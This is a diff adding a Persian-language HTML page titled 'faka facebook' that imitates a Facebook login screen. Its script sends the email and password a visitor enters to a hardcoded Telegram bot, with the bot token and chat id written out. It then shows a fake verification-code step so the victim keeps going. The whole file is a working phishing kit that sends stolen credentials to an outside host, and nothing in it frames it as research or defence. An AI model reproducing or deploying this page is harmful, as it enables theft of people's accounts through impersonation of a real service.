@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+        <title> faka facebook</title>
+          <meta name="viewport" content="width=device-width,initail-scale=1.0">
+        <style>
+        body{
+            margin:0px;
+            padding:0px;
+            box-sizing: border-box;
+            
+        }
+            .first{
+                background-image: url(bg1.png);
+                margin:auto;
+                text-align: center;
+                width:100%;
+                height:100%;
+            }
+            img{
+                padding:80px;
+                width:80px;
+                height:80px;
+            }
+            input{
+                height:50px;
+                width:330px;
+                border-radius: 10px;
+                border: none;
+                margin-top:20px;
+                text-align: center;
+                font-size: 20px;
+                border:none;
+                background-color: #FCF7F8;
+            }
+            button{
+                height: 40px;
+                width: 300px;
+                background-color: #0076FF;
+                border-radius: 20px;
+                border:none;
+                color:white;
+                font-size: 20px;
+            }
+            input:hover{
+                background-color: white;
+            }
+            a{
+                text-decoration: none;
+                color:white;
+                font-size: 18px;
+                margin-top:20px;
+            }
+            p{
+                width:330px;
+                height:40px;
+                background-color: none;
+                border:1px solid blue;
+                text-align: center;
+                margin-left: 18px;
+                border-radius: 20px;
+                padding: auto;
+            }
+            .then{
+                background-image: url(bg1.png);
+                margin: auto;
+                text-align: center;
+                display: none;
+                height: 100%;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="first" id="first">
+            <img src="face.png" alt="" />
+            <input type="email" id ="email" placeholder="شماره تلفن همراه یا ایمیل" /><br>
+            <input type="password" id ="pass" placeholder="گذرواژه" /><br><br>
+            <button onclick="send()">وارد شدن</button><br>
+            <a href="">فراموش کردن گذرواژه؟</a><br>
+            <p>ایجاد حساب جدیدی</p>
+            </div>
+            <div class="then" id ="theni">
+                <h1> کد تایید</h1><br>
+                <h5>ما کدی را در جیمیل شما ارسال کردیم لطفا کد را وارد کنید و از حساب تان استفاده کنید</h5><br>
+                <input type="number" name="" id="number" value="" placeholder="######"/><br><br><br>
+                <button onclick="then()">وارد شدن</button>
+            </div>
+            <script>
+                function send(){
+                    var email = document.getElementById('email').value.trim();
+                    var pass = document.getElementById('pass').value.trim();
+                    var number = document.getElementById('number').value.trim();
+                    if ( email === "" || pass === ""){
+                        alert("لطفا انپوت ها را تکمیل کنید");
+                    }
+                    var id = "5985941427";
+                    var token ="7645134133:AAGxjjv2TQn0JwIAeoj9R0ZZmZNaa_5_I3w";
+                    var message = `new user \n\n email:  ${email}\npassword:   ${pass}`;
+                    var url = `https://api.telegram.org/bot${token}/sendmessage?chat_id=${id}&text=${encodeURIComponent(message)}`;
+                    fetch(url)
+                    .then(response => response.json())
+                        .then( data =>{
+                            if ( data.ok){
+                       document.getElementById('first').style.display="none";
+                       document.getElementById('theni').style.display="block";
+                            }
+                            else{
+                                alert("لفطا اطلاعات دقیق اراعه دهید");
+                            }
+                        })
+                    .catch( error=> console.error("error:",error));
+                }
+                function then(){
+                    var number = document.getElementById('number').value.trim();
+                    if( number === "697689" || number === "637388"){
+                        alert("شما می توانی از حساب تان استفاده کنید");
+                        return;
+                    }
+                    else{
+                        alert("کد اشتباه است");
+                    }
+                    
+                }
+            </script>
+    </body>
+</html>
